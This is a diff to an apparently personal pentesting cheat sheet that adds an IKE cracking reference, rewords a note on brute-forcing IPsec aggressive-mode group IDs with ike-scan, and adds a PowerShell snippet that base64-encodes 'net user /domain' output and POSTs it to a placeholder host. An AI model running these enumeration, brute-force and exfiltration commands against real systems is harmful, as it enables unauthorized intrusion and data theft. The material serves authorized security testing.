@@ -1,4 +1,4 @@
-[**snovvcrash’s Security Blog**](https://snovvcrash.github.io)
+ [**snovvcrash’s Security Blog**](https://snovvcrash.github.io)
 
 [//]: # (# -- 5 spaces before)
 [//]: # (## -- 4 spaces before)
@@ -1372,6 +1372,7 @@ QUIT
 
 * [xakep.ru/2015/05/13/ipsec-security-flaws/](https://xakep.ru/2015/05/13/ipsec-security-flaws/)
 * [book.hacktricks.xyz/pentesting/ipsec-ike-vpn-pentesting](https://book.hacktricks.xyz/pentesting/ipsec-ike-vpn-pentesting)
+* [www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cracking-ike-missionimprobable-part-1/](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cracking-ike-missionimprobable-part-1/)
 
 Generate list of all transform-sets:
 
@@ -1401,7 +1402,7 @@ Test for aggressive mode ON:
 $ sudo ike-scan -P -M -A -n FAKEID --trans=<TRANSFORM-SET> <IP>
 ```
 
-If no hash value is returned then brute force is possible:
+If no hash value is returned then brute force is (maybe also) possible:
 
 ```
 $ while read id; do (echo "[+] Valid ID: $id" && sudo ike-scan -M -A -n $id --trans=<TRANSFORM-SET> <IP>) | grep -B14 "1 returned handshake" | grep "Valid ID" |tee -a group-id.txt; done < dict.txt
@@ -1616,6 +1617,14 @@ Local file to base64:
 ```
 Cmd> certutil -encode <FILE_TO_ENCODE> C:\Windows\Temp\encoded.b64
 Cmd> type C:\Windows\Temp\encoded.b64
+```
+
+Local string to base64 and POST:
+
+```
+PS> $str = cmd /c net user /domain
+PS> $base64str = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
+PS> Invoke-RestMethod -Uri http://127.0.0.1/msg -Method POST -Body $base64str
 ```
 
 Full base64 file transfer from Linux to Windows:
